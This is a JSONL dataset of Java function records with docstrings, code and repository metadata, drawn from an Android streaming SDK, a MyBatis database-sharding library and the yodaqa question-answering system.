{"docstring": "/**\n * Set audio sample rate while streaming.<br/>\n * Would take effect on next {@link #startStream()} call.\n * default value 44100\n *\n * @param sampleRate sample rate in Hz.\n * @throws IllegalArgumentException\n */\n", "func_signal": "public void setAudioSampleRate(int sampleRate) throws IllegalArgumentException", "code": "{\n    if (sampleRate <= 0) {\n        throw new IllegalArgumentException(\"the AudioSampleRate must > 0\");\n    }\n\n    mAudioSampleRate = sampleRate;\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Release all resources used by KSYStreamer.\n */\n", "func_signal": "public void release()", "code": "{\n    if (mMainHandler != null) {\n        mMainHandler.removeCallbacksAndMessages(null);\n        mMainHandler = null;\n    }\n\n    synchronized (mReleaseObject) {\n        mImageCapture.release();\n        mWaterMarkCapture.release();\n        mAudioPlayerCapture.release();\n        mCameraCapture.release();\n        mAudioCapture.release();\n        mFilePublisher.release();\n        mGLRender.release();\n        setOnLogEventListener(null);\n        unregisterHeadsetPlugReceiver();\n        if (!mAudioAPMFilterMgt.getNSState()) {\n            mAudioAPMFilterMgt.release();\n        }\n    }\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Set codec id to video encoder.\n *\n * @param codecId video codec id to set.\n * @see AVConst#CODEC_ID_AVC\n * @see AVConst#CODEC_ID_HEVC\n */\n", "func_signal": "public void setVideoCodecId(int codecId) throws IllegalArgumentException", "code": "{\n    if (codecId != AVConst.CODEC_ID_AVC &&\n            codecId != AVConst.CODEC_ID_HEVC) {\n        throw new IllegalArgumentException(\"input video codecid error\");\n    }\n    mVideoCodecId = codecId;\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * \u6839\u636e\u5206\u7247\u53c2\u6570\u503c\u8ba1\u7b97\u5206\u8868\u540d\n *\n * @param shardingPara\n * @return \u5206\u8868\u540d0xxx\n */\n", "func_signal": "public static Integer caculateTableIndex(Long shardingPara)", "code": "{\n    if (shardingPara >= 0) {\n        return new Long(shardingPara % 10000 % 512).intValue();\n    }\n    return null;\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\client\\ShardingCaculator.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * @author by jiuru on 16/7/14.\n */\n", "func_signal": "@Target(ElementType.TYPE)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface DataSourceRouting", "code": "{\n    /**\n     * \u9759\u6001\u7ed1\u5b9a\u8be5Mapper\u5bf9\u5e94\u7684\u6570\u636e\u6e90\n     *\n     * @return \u7ed1\u5b9a\u7684\u6570\u636e\u6e90\u7684\u540d\u79f0\n     */\n    String value() default \"\";\n\n    /**\n     * \u6307\u5b9a\u8fd0\u884c\u65f6\u8def\u7531\u5904\u7406\u7684Handler\uff0c\u52a8\u6001\u6307\u5b9a\u5bf9\u5e94\u7684\u6570\u636e\u6e90\u3002<b>\u6ce8\u610f:\u6b64\u65b9\u5f0f\u4e0d\u80fd\u652f\u6301\u4e8b\u52a1\uff01</b>\n     *\n     * @return\n     */\n    Class<? extends DataSourceRoutingHandler> handler() default EmptyDataSourceRoutingHandler.class;\n\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\db\\DataSourceRouting.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u91cd\u65b0\u8bbe\u7f6eSqlSource\n *\n * @param ms\n */\n", "func_signal": "public void setSqlSource(MappedStatement ms, Configuration configuration)", "code": "{\n    MapperEnhancer mapperEnhancer = getMapperTemplate(ms.getId());\n    try {\n        if (mapperEnhancer != null) {\n            mapperEnhancer.setSqlSource(ms, configuration);\n        }\n    } catch (Exception e) {\n        throw new RuntimeException(\"\u8c03\u7528\u65b9\u6cd5\u5f02\u5e38:\" + e.getMessage(), e);\n    }\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\MapperHelperForSharding.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u5faa\u73af\u5411\u4e0a\u8f6c\u578b, \u83b7\u53d6\u5bf9\u8c61\u7684 DeclaredField\n * @param object : \u5b50\u7c7b\u5bf9\u8c61\n * @param fieldName : \u7236\u7c7b\u4e2d\u7684\u5c5e\u6027\u540d\n * @return \u7236\u7c7b\u4e2d\u7684\u5c5e\u6027\u5bf9\u8c61\n */\n", "func_signal": "public static Field getDeclaredField(Object object, String fieldName)", "code": "{\n    Field field = null ;\n    Class<?> clazz = object.getClass() ;\n    for(; clazz != Object.class ; clazz = clazz.getSuperclass()) {\n        try {\n            field = clazz.getDeclaredField(fieldName) ;\n            return field ;\n        } catch (Exception e) {\n        }\n    }\n    return null;\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\base\\ReflectUtil.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u91cd\u65b0\u8bbe\u7f6eSqlSource\n *\n * @param ms\n * @throws java.lang.reflect.InvocationTargetException\n * @throws IllegalAccessException\n */\n", "func_signal": "public void setSqlSource(MappedStatement ms, Configuration configuration) throws Exception", "code": "{\n    Method method = methodMap.get(getMethodName(ms));\n    try {\n        if (method.getReturnType() == Void.TYPE) {\n            method.invoke(this, ms);\n        } else if (SqlSource.class.isAssignableFrom(method.getReturnType())) {\n            //\u4ee3\u7801\u589e\u5f3a \u6269\u5145\u4e3a512\u4e2a\u65b9\u6cd5\u3002\n            for (long i = 0; i < 512; i++) {\n\n                //\u65b0\u7684\u5e26sharding\u7684sql\n                SqlSource sqlSource = (SqlSource) method.invoke(this, ms, configuration, i);\n\n                String newMsId = ms.getId() + ShardingCaculator.getNumberWithZeroSuffix(i);\n                newMsId = newMsId.replace(\"Mapper.\", \"MapperSharding\" + getMethodName(ms) + \".\");\n\n                //\u6dfb\u52a0\u5230ms\u5e93\u4e2d\n                MappedStatement newMs = copyFromMappedStatement(ms, sqlSource, newMsId);\n                configuration.addMappedStatement(newMs);\n                setSqlSource(newMs, sqlSource);\n            }\n        } else {\n            throw new RuntimeException(\"\u81ea\u5b9a\u4e49Mapper\u65b9\u6cd5\u8fd4\u56de\u7c7b\u578b\u9519\u8bef,\u53ef\u9009\u7684\u8fd4\u56de\u7c7b\u578b\u4e3avoid\u548cSqlNode!\");\n        }\n    } catch (IllegalAccessException e) {\n        throw new RuntimeException(e);\n    } catch (InvocationTargetException e) {\n        throw new RuntimeException(e.getTargetException() != null ? e.getTargetException() : e);\n    }\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\MapperEnhancer.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u83b7\u53d6\u65b9\u6cd5\u5bf9\u5e94\u7684\u6570\u636e\u773c\u7c7b\u578b\n *\n * @param method\n * @return\n */\n", "func_signal": "private static DataSourceType getDataSourceType(Method method)", "code": "{\n    DataSourceType dataSourceType = cache.get(method);\n    if (dataSourceType == null) {\n        synchronized (method) {\n            dataSourceType = cache.get(method);\n            if (dataSourceType == null) {\n                dataSourceType = determineDataSourceType(method);\n                cache.put(method, dataSourceType);\n            }\n        }\n    }\n    return dataSourceType;\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\base\\ReadWriteSplittingContextInitializer.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u9488\u5bf9Spring\u6ce8\u5165\u9700\u8981\u5904\u7406\u7684SqlSession\n *\n * @param sqlSessions\n */\n", "func_signal": "public void setSqlSessions(SqlSession[] sqlSessions)", "code": "{\n    if (sqlSessions != null && sqlSessions.length > 0) {\n        this.sqlSessions.addAll(Arrays.asList(sqlSessions));\n    }\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\MapperHelperForSharding.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u5bf9mapper\u8fdb\u884c\u589e\u5f3a\uff0c\u751f\u6210\u65b0\u7684mapper\uff0c\u5e76\u4e3b\u52a8\u52a0\u8f7d\u65b0mapper\u7c7b\u5230classloader\n *\n * @param mapperClassName\n */\n", "func_signal": "public static void enhanceMapperClass(String mapperClassName) throws Exception", "code": "{\n\n    Class originClass = Class.forName(mapperClassName);\n    Method[] originMethods = originClass.getDeclaredMethods();\n\n    CtClass cc = pool.get(mapperClassName);\n\n    for (CtMethod ctMethod : cc.getDeclaredMethods()) {\n        CtClass enhanceClass = pool.makeInterface(mapperClassName + \"Sharding\" + ctMethod.getName());\n        for (long i = 0L; i < 512; i++) {\n            CtMethod newMethod = new CtMethod(ctMethod.getReturnType(), ctMethod.getName() + ShardingCaculator.getNumberWithZeroSuffix(i), ctMethod.getParameterTypes(), enhanceClass);\n\n            Method method = getOriginMethod(newMethod, originMethods);\n            if(method.getParameterAnnotations()[0].length > 0) {\n                ClassFile ccFile = enhanceClass.getClassFile();\n                ConstPool constPool = ccFile.getConstPool();\n\n                //\u62f7\u8d1d\u6ce8\u89e3\u4fe1\u606f\u548c\u6ce8\u89e3\u5185\u5bb9\uff0c\u4ee5\u652f\u6301mybatis mapper\u7c7b\u7684\u52a8\u6001\u7ed1\u5b9a\n                newMethod.getMethodInfo().addAttribute(MapperAnnotationEnhancer.duplicateParameterAnnotationsAttribute(constPool, method));\n            }\n            enhanceClass.addMethod(newMethod);\n        }\n        Class<?> loadThisClass = enhanceClass.toClass();\n\n        //2015.09.22\u540e\u4e0d\u518d\u8f93\u51fa\u7c7b\u5230\u672c\u5730\n//            enhanceClass.writeFile(\".\");\n    }\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\MapperEnhancer.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * Spring\u521d\u59cb\u5316\u65b9\u6cd5\uff0c\u4f7f\u7528Spring\u65f6\u9700\u8981\u914d\u7f6einit-method=\"initMapper\"\n */\n", "func_signal": "public void initMapper()", "code": "{\n    // \u53ea\u6709Spring\u4f1a\u6267\u884c\u8fd9\u4e2a\u65b9\u6cd5,\u6240\u4ee5Spring\u914d\u7f6e\u7684\u65f6\u5019,\u4ece\u8fd9\u513f\u53ef\u4ee5\u5c1d\u8bd5\u83b7\u53d6Spring\u7684\u7248\u672c\n    // \u5148\u5224\u65adSpring\u7248\u672c,\u5bf9\u4e0b\u9762\u7684\u64cd\u4f5c\u6709\u5f71\u54cd\n    // Spring4\u4ee5\u4e0a\u652f\u6301\u6cdb\u578b\u6ce8\u5165,\u56e0\u6b64\u53ef\u4ee5\u626b\u63cf\u901a\u7528Mapper\n    if (!initSpringVersion()) {\n        throw new RuntimeException(\"Error! Spring4 is necessary!\");\n    }\n\n    for (SqlSession sqlSession : sqlSessions) {\n        processConfiguration(sqlSession.getConfiguration());\n    }\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\MapperHelperForSharding.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u6309\u8ba2\u5355\u53f7\u6279\u91cf\u67e5\u8be2\uff1a\u8de8\u8868\u67e5\uff0c\u5148\u6309\u5206\u8868\u505a\u5206\u7ec4\n *\n * @param listShopOrderIds\n * @return tableNo -> orderIds\n */\n", "func_signal": "public static Map<Integer, List<Long>> getTableNoAndOrderIdsMap(List<Long> listShopOrderIds)", "code": "{\n\n    HashMap<Integer, List<Long>> shopOrderIdsMap = new HashMap();\n    if (listShopOrderIds == null || listShopOrderIds.size() == 0) {\n        return shopOrderIdsMap;\n    }\n    for (Long shopOrderId : listShopOrderIds) {\n        Integer tableNo = ShardingCaculator.caculateTableIndex(shopOrderId);\n        List<Long> orderIds = shopOrderIdsMap.get(tableNo);\n        if (orderIds == null) {\n            orderIds = new ArrayList<>();\n        }\n        orderIds.add(shopOrderId);\n        shopOrderIdsMap.put(tableNo, orderIds);\n    }\n    return shopOrderIdsMap;\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\client\\ShardingCaculator.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u9700\u8981sharding\u6269\u5c55\u7684dao\u5c42\u65b9\u6cd5\n * @auther qigong on 6/4/15 11:02 AM.\n */\n", "func_signal": "@Target(ElementType.METHOD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface ShardingExtensionMethod", "code": "{\n    Class<?> type() default MapperResourceEnhancer.class;\n\n    String method() default \"enhancedShardingSQL\";\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\annotation\\ShardingExtensionMethod.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u91cd\u65b0\u8bbe\u7f6eSqlSource\n *\n * @param ms\n * @param sqlSource\n */\n", "func_signal": "protected void setSqlSource(MappedStatement ms, SqlSource sqlSource)", "code": "{\n    MetaObject msObject = forObject(ms);\n    msObject.setValue(\"sqlSource\", sqlSource);\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\MapperEnhancer.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u6839\u636emsId\u83b7\u53d6\u63a5\u53e3\u7c7b\n *\n * @param msId\n * @return\n * @throws ClassNotFoundException\n */\n", "func_signal": "public static Class<?> getMapperClass(String msId)", "code": "{\n    String mapperClassStr = msId.substring(0, msId.lastIndexOf(\".\"));\n    try {\n        return Class.forName(mapperClassStr);\n    } catch (ClassNotFoundException e) {\n        throw new RuntimeException(\"\u65e0\u6cd5\u83b7\u53d6Mapper\u63a5\u53e3\u4fe1\u606f:\" + msId);\n    }\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\MapperEnhancer.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u6839\u636e\u5206\u7247\u53c2\u6570\u503c\u8ba1\u7b97\u5206\u5e93\u540d\uff08\u903b\u8f91\u5e93\uff09\n *\n * @param shardingPara\n * @return \u5206\u5e93\u540d000x\n */\n", "func_signal": "public static String caculateSchemaName(String fieldName, Long shardingPara)", "code": "{\n    if (shardingPara >= 0) {\n\n        if (\"sellerUserId\".equals(fieldName)) {\n            return \"sellertrade\" + getNumberWithZeroSuffix(((shardingPara % 10000) % 512) / 64);\n        } else {\n            return \"trade\" + getNumberWithZeroSuffix(((shardingPara % 10000) % 512) / 64);\n        }\n    }\n    return null;\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\client\\ShardingCaculator.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u901a\u8fc7\u901a\u7528Mapper\u63a5\u53e3\u83b7\u53d6\u5bf9\u5e94\u7684MapperTemplate\n *\n * @param mapperClass\n */\n", "func_signal": "private MapperEnhancer fromMapperClass(Class<?> mapperClass)", "code": "{\n    Method[] methods = mapperClass.getDeclaredMethods();\n    Class<?> templateClass = null;\n    Class<?> tempClass = null;\n    Set<String> methodSet = new HashSet<String>();\n    for (Method method : methods) {\n        if (method.isAnnotationPresent(ShardingExtensionMethod.class)) {\n            ShardingExtensionMethod annotation = method.getAnnotation(ShardingExtensionMethod.class);\n            tempClass = annotation.type();\n            methodSet.add(method.getName());\n        }\n        if (templateClass == null) {\n            templateClass = tempClass;\n        } else if (templateClass != tempClass) {\n            throw new RuntimeException(\"\u4e00\u4e2a\u901a\u7528Mapper\u4e2d\u53ea\u5141\u8bb8\u5b58\u5728\u4e00\u4e2aMapperTemplate\u5b50\u7c7b!\");\n        }\n    }\n    if (templateClass == null || !MapperEnhancer.class.isAssignableFrom(templateClass)) {\n        throw new RuntimeException(\"\u63a5\u53e3\u4e2d\u4e0d\u5b58\u5728\u5305\u542btype\u4e3aMapperTemplate\u7684Provider\u6ce8\u89e3\uff0c\u8fd9\u4e0d\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u901a\u7528Mapper\u63a5\u53e3\u7c7b!\");\n    }\n    MapperEnhancer mapperEnhancer = null;\n    try {\n        mapperEnhancer = (MapperEnhancer) templateClass.getConstructor(Class.class).newInstance(mapperClass);\n    } catch (Exception e) {\n        throw new RuntimeException(\"\u5b9e\u4f8b\u5316MapperTemplate\u5bf9\u8c61\u5931\u8d25:\" + e.getMessage(), e);\n    }\n    // \u6ce8\u518c\u65b9\u6cd5\n    for (String methodName : methodSet) {\n        try {\n            mapperEnhancer.addMethodMap(methodName, templateClass.getMethod(\"enhancedShardingSQL\", MappedStatement.class, Configuration.class, Long.class));\n        } catch (NoSuchMethodException e) {\n            throw new RuntimeException(templateClass.getCanonicalName() + \"\u4e2d\u7f3a\u5c11enhancedShardingSQL\u65b9\u6cd5!\");\n        }\n    }\n    return mapperEnhancer;\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\MapperHelperForSharding.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u6839\u636e\u5206\u7247\u53c2\u6570\u503c\u8ba1\u7b97\u5206\u8868\u540d\n *\n * @param shardingPara\n * @return \u5206\u8868\u540d0xxx\n */\n", "func_signal": "public static String caculateTableName(Long shardingPara)", "code": "{\n    if (shardingPara >= 0) {\n        return \"TradeOrder\" + getNumberWithZeroSuffix((shardingPara % 10000) % 512);\n    }\n    return null;\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\client\\ShardingCaculator.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u83b7\u53d6\u65b9\u6cd5\u5bf9\u5e94\u7684\u6570\u636e\u6e90\u7c7b\u578b\n *\n * @param method\n * @return\n */\n", "func_signal": "private DataSourceType getDataSourceType(Method method)", "code": "{\n    DataSourceType dataSourceType = this.cache.get(method);\n    if (dataSourceType == null) {\n        synchronized (method) {\n            dataSourceType = this.cache.get(method);\n            if (dataSourceType == null) {\n                dataSourceType = this.determineDataSourceType(method);\n                this.cache.put(method, dataSourceType);\n            }\n        }\n    }\n    return dataSourceType;\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\db\\ReadWriteSplittingAdvice.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u68c0\u6d4bSpring\u7248\u672c\u53f7,Spring4.x\u4ee5\u4e0a\u652f\u6301\u6cdb\u578b\u6ce8\u5165\n */\n", "func_signal": "private boolean initSpringVersion()", "code": "{\n    try {\n        // \u53cd\u5c04\u83b7\u53d6SpringVersion\n        Class<?> springVersionClass = Class.forName(\"org.springframework.core.SpringVersion\");\n        springVersion = (String) springVersionClass.getDeclaredMethod(\"getVersion\", new Class<?>[0]).invoke(null,\n                new Object[0]);\n        spring = true;\n        if (springVersion.indexOf(\".\") > 0) {\n            int MajorVersion = Integer.parseInt(springVersion.substring(0, springVersion.indexOf(\".\")));\n            if (MajorVersion > 3) {\n                spring4 = true;\n            } else {\n                spring4 = false;\n            }\n        }\n    } catch (Exception e) {\n        spring = false;\n        spring4 = false;\n    }\n    return spring && spring4;\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\MapperHelperForSharding.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u5904\u7406configuration\u4e2d\u5168\u90e8\u7684MappedStatement\n *\n * @param configuration\n */\n", "func_signal": "public void processConfiguration(Configuration configuration)", "code": "{\n    Collection<MappedStatement> collection = configuration.getMappedStatements();\n    // \u9632\u6b62\u53cd\u590d\u5904\u7406\u4e00\u4e2a\n    if (collectionSet.contains(collection)) {\n        return;\n    } else {\n        collectionSet.add(collection);\n    }\n\n    Collection<MappedStatement> tmpCollection = new HashSet<>();\n    tmpCollection.addAll(collection);\n\n    Iterator<MappedStatement> iterator = tmpCollection.iterator();\n    while (iterator.hasNext()) {\n        Object object = iterator.next();\n        if (object instanceof MappedStatement) {\n            MappedStatement ms = (MappedStatement) object;\n            if (isMapperMethod(ms.getId())) {\n                setSqlSource(ms, configuration);\n            }\n        }\n    }\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\MapperHelperForSharding.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/**\n * \u6ce8\u518c\u901a\u7528Mapper\u63a5\u53e3\n *\n * @param mapperClass\n * @throws Exception\n */\n", "func_signal": "public void registerMapper(String mapperClass)", "code": "{\n    try {\n        registerMapper(Class.forName(mapperClass));\n    } catch (ClassNotFoundException e) {\n        throw new RuntimeException(\"\u6ce8\u518c\u901a\u7528Mapper[\" + mapperClass + \"]\u5931\u8d25\uff0c\u627e\u4e0d\u5230\u8be5\u901a\u7528Mapper!\");\n    }\n}", "path": "tsharding-client\\src\\main\\java\\com\\mogujie\\trade\\tsharding\\route\\orm\\MapperHelperForSharding.java", "repo_name": "baihui212/tsharding", "stars": 695, "license": "mit", "language": "java", "size": 84}
{"docstring": "/** Query for a given enwiki pageID, returning a set of PropertyValue\n * instances.\n * The paths set are extra properties to specifically query for:\n * they bypass the blacklist and can traverse multiple nodes. */\n", "func_signal": "public List<PropertyValue> queryPageID(int pageID, List<PathScore> paths, List<Concept> concepts, List<String> witnessLabels, Logger logger)", "code": "{\n\tSet<TitledMid> topics = queryTopicByPageID(pageID, logger);\n\tList<PropertyValue> results = new ArrayList<PropertyValue>();\n\tfor (TitledMid topic : topics) {\n\t\tresults.addAll(queryTopicGeneric(topic.title, topic.mid, logger));\n\t\tif (!paths.isEmpty())\n\t\t\tresults.addAll(queryTopicSpecific(topic.title, topic.mid, paths, concepts, witnessLabels, logger));\n\t}\n\treturn results;\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\provider\\rdf\\FreebaseOntology.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/** Query for a given enwiki pageID, returning a set of topic MIDs. */\n", "func_signal": "public Set<TitledMid> queryTopicByPageID(int pageID, Logger logger)", "code": "{\n\tString rawQueryStr =\n\t\t\"?topic <http://rdf.freebase.com/key/wikipedia.en_id> \\\"\" + pageID + \"\\\" .\\n\" +\n\t\t\"?topic rdfs:label ?label .\\n\" +\n\t\t\"FILTER( LANGMATCHES(LANG(?label), \\\"en\\\") )\\n\" +\n\t\t\"\";\n\t// logger.debug(\"executing sparql query: {}\", rawQueryStr);\n\tList<Literal[]> rawResults = rawQuery(rawQueryStr,\n\t\tnew String[] { \"topic\", \"label\" }, TOPIC_LIMIT);\n\n\tSet<TitledMid> results = new HashSet<>(rawResults.size());\n\tfor (Literal[] rawResult : rawResults) {\n\t\tString mid = rawResult[0].getString();\n\t\tString title = rawResult[1].getString();\n\t\tlogger.debug(\"Freebase {} topic MID {} ({})\", title, mid, pageID);\n\t\tresults.add(new TitledMid(mid, title));\n\t}\n\n\treturn results;\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\provider\\rdf\\FreebaseOntology.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/** Reset the answer list, typically when have scored them.\n * @param answer the answer to set */\n", "func_signal": "public synchronized void setAnswers(List<QuestionAnswer> answers)", "code": "{\n\tthis.answers = answers;\n\tgen_answers ++;\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\flow\\dashboard\\Question.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/** Stores and deduplicates unique AnswerSource and returns its ID. */\n", "func_signal": "public synchronized int storeAnswerSource(AnswerSource as)", "code": "{\n\tgen_sources++;\n\tfor (Map.Entry<Integer, AnswerSource> savedSource : sources.entrySet()) {\n\t\tif (savedSource.getValue().equals(as)) {\n\t\t\tas.setSourceID(savedSource.getValue().getSourceID());\n\t\t\treturn savedSource.getKey();\n\t\t}\n\t}\n\tint sourceID = SourceIDGenerator.getInstance().generateID();\n\tas.setSourceID(sourceID);\n\tsources.put(sourceID, as);\n\treturn sourceID;\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\flow\\dashboard\\Question.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/**\n * @see org.apache.uima.resource.Resource#destroy()\n */\n", "func_signal": "public void destroy()", "code": "{\n  mPool.destroy();\n  super.destroy();\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\flow\\asb\\MultiprocessingAnalysisEngine_MultiplierOk.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/**\n * @see org.apache.uima.analysis_engine.AnalysisEngine#process(org.apache.uima.cas.CAS,\n *      org.apache.uima.analysis_engine.ResultSpecification, org.apache.uima.util.ProcessTrace)\n */\n", "func_signal": "public void process(CAS aCAS, ResultSpecification aResultSpec, ProcessTrace aTrace)\n        throws ResultNotSupportedException, AnalysisEngineProcessException", "code": "{\n  AnalysisEngine ae = null;\n  try {\n    ae = getAeFromPool();       \n    ae.process(aCAS, aResultSpec, aTrace);\n  } finally {\n    if (ae != null) {\n      mPool.releaseAnalysisEngine(ae);\n    }\n  }\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\flow\\asb\\MultiprocessingAnalysisEngine_MultiplierOk.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/* Check all dependencies, picking the \"pinnacles\", i.e.\n * tokens that govern some dependencies but aren't governed\n * themselves, these might be local roots.  In case of multiple\n * pinnacles, the first one is chosen. */\n", "func_signal": "protected FocusPair fpDepRoot(JCas jcas)", "code": "{\n\tFocusPair fp = null;\n\n\t/* Sometimes, we will get dependencies that reach out of\n\t * the current CandidateAnswerCAS. Therefore, consider\n\t * only governors that have corresponding tokens in our CAS. */\n\tSet<Token> tokens = new HashSet<Token>();\n\tfor (Token t : JCasUtil.select(jcas, Token.class))\n\t\ttokens.add(t);\n\n\tSortedSet<Token> governors = new TreeSet<Token>(\n\t\tnew Comparator<Token>(){ @Override\n\t\t\tpublic int compare(Token t1, Token t2){\n\t\t\t\treturn t1.getBegin() - t2.getBegin();\n\t\t\t}\n\t\t});\n\tfor (Dependency d : JCasUtil.select(jcas, Dependency.class)) {\n\t\tif (tokens.contains(d.getGovernor())) {\n\t\t\tgovernors.add(d.getGovernor());\n\t\t\t// logger.debug(\"+ governor {}\", d.getGovernor());\n\t\t}\n\t}\n\tfor (Dependency d : JCasUtil.select(jcas, Dependency.class)) {\n\t\tif (tokens.contains(d.getGovernor())) {\n\t\t\tgovernors.remove(d.getDependent());\n\t\t\t// logger.debug(\"- dependent {}\", d.getDependent());\n\t\t}\n\t}\n\n\tfor (Token t : governors) {\n\t\tif (fp != null) {\n\t\t\tlogger.debug(\"?. Ignoring secondary potential focus '{}' in: {}\",\n\t\t\t\tt.getCoveredText(), jcas.getDocumentText());\n\t\t\tcontinue;\n\t\t}\n\t\tfp = new FocusPair(t, t);\n\t}\n\treturn fp;\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\analysis\\answer\\FocusGenerator.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
{"docstring": "/* (non-Javadoc)\n * @see org.apache.uima.analysis_engine.impl.AnalysisEngineImplBase#process(org.apache.uima.jcas.JCas)\n */\n", "func_signal": "@Override\npublic ProcessTrace process(JCas aJCas) throws AnalysisEngineProcessException", "code": "{\n  AnalysisEngine ae = null;\n  try {\n    ae = getAeFromPool();       \n    return ae.process(aJCas);\n  } finally {\n    if (ae != null) {\n      mPool.releaseAnalysisEngine(ae);\n    }\n  }\n}", "path": "src\\main\\java\\cz\\brmlab\\yodaqa\\flow\\asb\\MultiprocessingAnalysisEngine_MultiplierOk.java", "repo_name": "brmson/yodaqa", "stars": 615, "license": "other", "language": "java", "size": 25833}
